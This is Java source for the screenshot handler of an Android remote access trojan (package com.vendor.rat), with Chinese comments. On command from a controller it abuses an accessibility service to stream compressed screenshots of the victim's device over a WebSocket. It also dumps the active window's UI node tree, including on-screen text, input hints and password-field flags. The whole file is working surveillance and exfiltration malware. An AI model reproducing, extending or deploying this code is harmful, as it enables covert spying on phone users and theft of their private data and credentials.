package com.vendor.rat.control.handler;

import android.graphics.Bitmap;
import android.graphics.Rect;
import android.util.Base64;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.vendor.rat.network.NetworkManager;
import com.vendor.rat.network.WebSocketClient;
import com.vendor.rat.service.MyAccessibilityService;

import java.io.ByteArrayOutputStream;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * 截图/投屏/文字辅助处理器
 *
 * comdtype=SN   → 实时投屏 (截图) → subc="screen"
 * comdtype=SM   → 实时截图 → subc="screenshot"
 * comdtype=SK   → 文字辅助 (无障碍节点树) → subc="readScreen"
 * comdtype=SNOFF/SMOFF/SKOFF → 停止
 */
public class ScreenshotHandler {

    private static final String TAG = "ScreenshotHandler";
    private static final int JPEG_QUALITY = 30;
    private static final float SCALE_FACTOR = 0.5f;
    private static final long FRAME_INTERVAL_MS = 1100;
    private static final long NODE_TREE_INTERVAL_MS = 800;
    private static final int MAX_NODE_DEPTH = 20;

    private final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
    private ScheduledFuture<?> streamingTask;
    private final AtomicBoolean streaming = new AtomicBoolean(false);

    private volatile String activeSubc = "screenshot";
    private volatile String activeMode = "screenshot"; // "screenshot", "screen", "readScreen"

    public void handle(JsonObject command) {
        String comdtype = command.has("comdtype") ? command.get("comdtype").getAsString() : "";
        Log.d(TAG, "Screen command: comdtype=" + comdtype);

        switch (comdtype) {
            case "SN":
                startStreaming("screen", "screen");
                break;
            case "SM":
                startStreaming("screenshot", "screenshot");
                break;
            case "SK":
                startStreaming("readScreen", "readScreen");
                break;
            case "SMOFF":
            case "SNOFF":
            case "SKOFF":
                stopStreaming();
                break;
            default:
                Log.w(TAG, "Unknown screen comdtype: " + comdtype);
        }
    }

    private void startStreaming(String subc, String mode) {
        if (streaming.get()) {
            stopStreaming();
        }

        streaming.set(true);
        activeSubc = subc;
        activeMode = mode;

        MyAccessibilityService service = MyAccessibilityService.P();
        if (service == null) {
            Log.e(TAG, "AccessibilityService not available");
            streaming.set(false);
            return;
        }

        long interval = "readScreen".equals(mode) ? NODE_TREE_INTERVAL_MS : FRAME_INTERVAL_MS;
        Log.i(TAG, "Starting streaming: mode=" + mode + ", interval=" + interval + "ms");

        streamingTask = scheduler.scheduleAtFixedRate(() -> {
            try {
                if ("readScreen".equals(activeMode)) {
                    readAndSendNodeTree();
                } else {
                    captureAndSendFrame();
                }
            } catch (Exception e) {
                Log.e(TAG, "Streaming task error", e);
            }
        }, 0, interval, TimeUnit.MILLISECONDS);
    }

    private void stopStreaming() {
        if (!streaming.getAndSet(false)) return;
        if (streamingTask != null) {
            streamingTask.cancel(false);
            streamingTask = null;
        }
        Log.i(TAG, "Streaming stopped");
    }

    // ============ 截图投屏 (SN/SM) ============

    private void captureAndSendFrame() {
        if (!streaming.get()) return;

        MyAccessibilityService service = MyAccessibilityService.P();
        WebSocketClient ws = NetworkManager.getInstance().getWebSocketClient();
        if (service == null || ws == null || !ws.isConnected()) return;

        final String subc = activeSubc;

        service.takeScreenshotAsync(new MyAccessibilityService.ScreenshotCallback() {
            @Override
            public void onScreenshot(Bitmap bitmap) {
                try {
                    int origW = bitmap.getWidth();
                    int origH = bitmap.getHeight();
                    int scaledW = (int) (origW * SCALE_FACTOR);
                    int scaledH = (int) (origH * SCALE_FACTOR);
                    Bitmap scaled = Bitmap.createScaledBitmap(bitmap, scaledW, scaledH, true);
                    bitmap.recycle();

                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    scaled.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, baos);
                    scaled.recycle();

                    String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
                    ws.sendScreen(subc, base64, origW, origH);
                } catch (Exception e) {
                    Log.e(TAG, "Frame encode/send failed", e);
                }
            }

            @Override
            public void onError(String error) {
                Log.w(TAG, "Screenshot failed: " + error);
            }
        });
    }

    // ============ 文字辅助 — 无障碍节点树 (SK) ============

    private void readAndSendNodeTree() {
        if (!streaming.get()) return;

        MyAccessibilityService service = MyAccessibilityService.P();
        WebSocketClient ws = NetworkManager.getInstance().getWebSocketClient();
        if (service == null || ws == null || !ws.isConnected()) return;

        try {
            // 优先从活跃窗口获取最新 root（避免返回缓存的旧窗口）
            AccessibilityNodeInfo root = null;
            try {
                List<AccessibilityWindowInfo> windows = service.getWindows();
                if (windows != null) {
                    for (AccessibilityWindowInfo w : windows) {
                        if (w != null && w.isActive()) {
                            root = w.getRoot();
                            break;
                        }
                    }
                }
            } catch (Exception ignored) {}

            // fallback
            if (root == null) {
                root = service.getRootInActiveWindow();
            }

            if (root == null) return;

            // 获取窗口信息
            String windowTitle = "";
            String activePackage = "";
            String activeWindow = "";

            CharSequence pkg = root.getPackageName();
            if (pkg != null) activePackage = pkg.toString();

            // 尝试从 windows 获取标题
            try {
                List<AccessibilityWindowInfo> windows = service.getWindows();
                if (windows != null) {
                    for (AccessibilityWindowInfo w : windows) {
                        if (w != null && w.isActive()) {
                            CharSequence title = w.getTitle();
                            if (title != null) windowTitle = title.toString();
                            break;
                        }
                    }
                }
            } catch (Exception ignored) {}

            // 当前活跃窗口类名
            CharSequence cls = root.getClassName();
            if (cls != null) activeWindow = cls.toString();

            // 递归遍历节点树
            JsonArray children = new JsonArray();
            traverseNode(root, 0, 0, children);
            root.recycle();

            // 构建消息
            JsonObject msg = new JsonObject();
            msg.addProperty("itype", "Slr_client");
            msg.addProperty("subc", "readScreen");
            msg.addProperty("pid", NetworkManager.getInstance().getDeviceId());
            msg.addProperty("windowTitle", windowTitle);
            msg.addProperty("activePackage", activePackage);
            msg.addProperty("activeWindow", activeWindow);
            msg.add("children", children);

            String json = msg.toString();
            Log.d(TAG, "readScreen: nodes=" + children.size() + ", pkg=" + activePackage);
            ws.send(json);
        } catch (Exception e) {
            Log.e(TAG, "readScreen failed", e);
        }
    }

    private void traverseNode(AccessibilityNodeInfo node, int depth, int index, JsonArray out) {
        if (node == null || depth > MAX_NODE_DEPTH) return;

        try {
            // 提取节点信息
            String text = node.getText() != null ? node.getText().toString() : null;
            String desc = node.getContentDescription() != null ? node.getContentDescription().toString() : null;
            String className = node.getClassName() != null ? node.getClassName().toString() : null;
            String id = node.getViewIdResourceName();
            String hintText = null;
            if (android.os.Build.VERSION.SDK_INT >= 26) {
                hintText = node.getHintText() != null ? node.getHintText().toString() : null;
            }

            // 只发送有意义的节点（有文字、有描述、可点击、可编辑、或是输入框）
            boolean hasContent = text != null || desc != null || hintText != null;
            boolean isInteractive = node.isClickable() || node.isEditable() || node.isFocusable()
                    || node.isCheckable() || node.isScrollable();
            boolean isPassword = node.isPassword();

            if (hasContent || isInteractive || isPassword) {
                Rect bounds = new Rect();
                node.getBoundsInScreen(bounds);

                JsonObject obj = new JsonObject();
                obj.addProperty("depth", depth);
                obj.addProperty("index", index);
                if (text != null) obj.addProperty("text", text);
                if (desc != null) obj.addProperty("desc", desc);
                if (className != null) obj.addProperty("cls", className);
                if (id != null) obj.addProperty("id", id);
                if (hintText != null) obj.addProperty("hint", hintText);
                obj.addProperty("x", bounds.centerX());
                obj.addProperty("y", bounds.centerY());
                obj.addProperty("l", bounds.left);
                obj.addProperty("t", bounds.top);
                obj.addProperty("r", bounds.right);
                obj.addProperty("b", bounds.bottom);
                if (node.isClickable()) obj.addProperty("click", true);
                if (node.isEditable()) obj.addProperty("edit", true);
                if (node.isFocused()) obj.addProperty("focus", true);
                if (node.isChecked()) obj.addProperty("checked", true);
                if (isPassword) obj.addProperty("pwd", true);
                if (node.isScrollable()) obj.addProperty("scroll", true);

                out.add(obj);
            }

            // 递归子节点
            int childCount = node.getChildCount();
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    traverseNode(child, depth + 1, i, out);
                    child.recycle();
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "traverseNode error at depth=" + depth, e);
        }
    }

    public boolean isStreaming() {
        return streaming.get();
    }
}
